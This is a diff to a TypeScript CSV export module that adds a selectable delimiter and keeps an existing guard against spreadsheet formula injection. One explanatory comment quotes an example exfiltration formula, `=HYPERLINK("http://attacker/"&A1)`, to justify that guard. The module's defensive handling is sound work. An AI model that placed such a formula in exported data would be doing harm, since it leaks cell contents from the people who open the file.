@@ -12,7 +12,7 @@
  * it is data the database held. The difference is only which grammar has to be
  * respected — RFC 4180 here, the engine's literal grammar there.
  *
- * Fields are separated by `,` and records by a single `\n`. RFC 4180 spells the
+ * Fields default to `,`, with `;` and tab also available; records use a single `\n`. RFC 4180 spells the
  * record separator `CRLF`; every reader that matters accepts a bare LF, and a field
  * that CONTAINS either is quoted, which is the part a reader cannot recover from.
  *
@@ -27,10 +27,12 @@ import { asBytes, binaryText } from "./binary";
 import { jsonText } from "./json";
 
 /**
- * The characters RFC 4180 says force a field to be quoted. A field is left bare
- * otherwise, so a numeric column stays numeric to a spreadsheet.
+ * Quotes and line breaks always require quoting. The delimiter is checked
+ * separately because it is now a parameter rather than part of this pattern.
  */
-const NEEDS_QUOTING = /["\r\n,]/;
+const NEEDS_QUOTING = /["\r\n]/;
+
+export type CsvDelimiter = "," | ";" | "\t";
 
 /**
  * A value as its CSV text, before quoting.
@@ -76,7 +78,7 @@ const FORMULA_LEAD = /^[=+\-@\t\r]/;
  */
 const PLAIN_NUMBER = /^[+-]?(\d+(\.\d*)?|\.\d+)([eE][+-]?\d+)?$/;
 
-function csvField(value: unknown): string {
+function csvField(value: unknown, delimiter: CsvDelimiter): string {
   const text = renderValue(value);
   // The one mutation in this file. `=HYPERLINK("http://attacker/"&A1)` is data in the
   // database and a formula in Excel, LibreOffice and Google Sheets, and it runs when
@@ -87,12 +89,12 @@ function csvField(value: unknown): string {
   if (FORMULA_LEAD.test(text) && !PLAIN_NUMBER.test(text)) {
     return `"'${text.replace(/"/g, '""')}"`;
   }
-  return NEEDS_QUOTING.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
+  return NEEDS_QUOTING.test(text) || text.includes(delimiter) ? `"${text.replace(/"/g, '""')}"` : text;
 }
 
 /** One CSV record, escaped field by field. */
-export function csvRow(values: readonly unknown[]): string {
-  return values.map(csvField).join(",");
+export function csvRow(values: readonly unknown[], delimiter: CsvDelimiter = ","): string {
+  return values.map((value) => csvField(value, delimiter)).join(delimiter);
 }
 
 /**
@@ -144,11 +146,20 @@ export function cellOf(row: Record<string, unknown>, column: string): unknown {
  * row is then read BY NAME, so a row whose keys arrive in another order, or which is
  * missing one, lands in the right columns instead of shifting the rest.
  */
-export function toCsv(rows: readonly Record<string, unknown>[], columns?: readonly string[]): string {
+export function toCsv(
+  rows: readonly Record<string, unknown>[],
+  columns?: readonly string[],
+  delimiter: CsvDelimiter = ",",
+): string {
   const header = resolveColumns(rows, columns);
-  const lines = [csvRow(header)];
+  const lines = [csvRow(header, delimiter)];
   for (const row of rows) {
-    lines.push(csvRow(header.map((column) => cellOf(row, column))));
+    lines.push(
+      csvRow(
+        header.map((column) => cellOf(row, column)),
+        delimiter,
+      ),
+    );
   }
   return lines.join("\n");
 }
